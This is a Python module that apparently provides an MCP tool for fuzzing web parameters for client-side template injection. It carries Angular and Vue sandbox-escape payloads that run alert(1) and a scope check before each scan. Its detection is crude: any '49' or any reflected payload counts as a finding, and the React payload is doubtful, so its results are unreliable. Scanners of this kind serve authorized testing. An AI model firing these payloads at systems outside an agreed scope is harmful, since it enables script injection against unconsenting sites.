"""Advanced CSTI Client-Side Template Injection Module"""
import httpx
import logging
from mcp_instance import mcp
from tools.http_utils import secure_request_sync, get_sync_client
from tools.db import is_in_scope

logger = logging.getLogger("stealthvision")
from config import USER_AGENT, DEFAULT_TIMEOUT

# CSTI payload templates
CSTI_PAYLOADS = {
    "angular": [
        "{{constructor.constructor('alert(1)')()}}",
        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
    ],
    "react": [
        "{{props.constructor(props)}}",
    ],
    "vue": [
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "generic": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
    ]
}

@mcp.tool()
def csti_fuzz(url: str, target_id: int, param: str = "q", payload_type: str = "generic") -> dict:
    """Test for Client-Side Template Injection vulnerabilities."""
    if not is_in_scope(target_id, url):
        return {"error": f"URL {url} is out of scope for target {target_id}. Scan aborted.", "success": False}
    
    try:
        payloads = CSTI_PAYLOADS.get(payload_type, CSTI_PAYLOADS["generic"])
        
        client = get_sync_client()
        vulnerabilities = []
        
        for payload in payloads:
            r = secure_request_sync(
                client, "GET",
                url,
                target_id,
                params={param: payload}
            )
            if "49" in r.text or payload in r.text:
                vulnerabilities.append({
                    "type": payload_type,
                    "payload": payload,
                    "evidence": "Template expression detected"
                })
        
        return {"vulnerabilities": vulnerabilities, "count": len(vulnerabilities), "success": True}
    except Exception as e:
        return {"error": str(e), "success": False}
    finally:
        client.close()